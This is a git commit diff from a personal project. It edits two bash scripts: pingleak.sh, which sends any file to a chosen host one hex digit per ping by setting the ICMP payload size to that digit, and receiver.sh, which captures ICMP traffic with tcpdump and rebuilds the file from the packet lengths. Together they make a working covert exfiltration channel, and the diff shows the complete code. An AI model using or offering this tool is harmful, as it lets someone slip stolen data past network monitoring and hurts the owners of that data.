1b28924eb7de7f87ad3c88842b77c17d1c609352
Alfredo Casanova <atcasanova@gmail.com>
2021-07-09 19:47:36 -0300

    meh

--- pingleak.sh
+++ pingleak.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
+(( $# != 2 )) && { echo "usage: $0 file host"; exit 2; }
 file=$1
 host=$2
 xxd -p $file|tr -d '\n' | \
 while read -n1 byte; do
-	echo enviando $byte
+	echo -n "$byte"
 	size=$(bc <<< "obase=10;ibase=16;${byte^^}");
-	timeout 0.2 ping -c1 -s $size $host 2>&1 >/dev/null
+	timeout 0.4 ping -c1 -s $size $host 2>&1 >/dev/null
 done
+
+echo "LeakPing done"
--- receiver.sh
+++ receiver.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
+(( $# == 1 )) && host="and host $1"
+
+tput bold; tput setaf 6;
+echo "Press ctrl+c when done"
+tput sgr0;
 file=$$.tmp
 tcpdump -l icmp | \
 grep --line-buffered -Po "(?<=length )[0-9]+" |\
 while IFS='\n' read;
-	do byte=$(bc <<< "ibase=10;obase=16; $((REPLY-=8))");
-	echo -n "$byte" | tee -a $file; 
+  do byte=$(bc <<< "ibase=10;obase=16; $((REPLY-=8))");
+  echo -n "$byte" | tee -a $file;
 done
 xxd -r -p $file > output$$.bin
+rm $$.tmp
 file output$$.bin
-
